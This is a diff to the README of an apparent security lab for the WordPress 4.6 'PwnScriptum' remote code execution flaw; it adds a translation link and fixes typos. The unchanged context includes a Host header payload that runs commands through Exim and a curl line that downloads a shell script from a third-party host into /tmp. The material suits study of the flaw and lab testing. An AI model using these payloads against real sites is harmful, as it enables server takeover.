@@ -1,6 +1,7 @@
 # Wordpress 4.6 Remote Code Execution Vulnerability (PwnScriptum)
 
 [中文版本(Chinese version)](README.zh-cn.md)
+[PT-BR(Portuguese version)](./README.pt-br.md)
 
 ## Reference link
 
@@ -38,7 +39,7 @@ We need to meet the following requirements to exploit this vulnerability:
 3. The command needs to use an absolute path
 4. Need know an existing user username
 
-In order to solve these problems, the vulnerability author came up with $`substr{0}{1}{$spool_directory}}` instead of `/`, using `${substr{10}{1}{$tod_log} }` method of replacing spaces.
+In order to solve these problems, the vulnerability author came up with $`substr{0}{1}{$spool_directory}}`instead of`/`, using `${substr{10}{1}{$tod_log} }` method of replacing spaces.
 
 However, there are still a lot of characters can't be used. So we need to put the command on the third-party website, and then download it to `/tmp` directory by `curl -o /tmp/rce example.com/shell.sh`.
 
@@ -52,7 +53,7 @@ Therefore, the expliot process is follows:
 - Produce the HTTP Host header:`target(any -froot@localhost -be ${run{command}} null)`.
 - Send these two packets in order.
 
-Here is [expliot.py](exploit.py)，change `target` to your target site，change `user` to an exist user name，change `shell_url` to your payload site.
+Here is [exploit.py](exploit.py)，change `target` to your target site，change `user` to an exist user name，change `shell_url` to your payload site.
 
 Execute to get the shell:
 
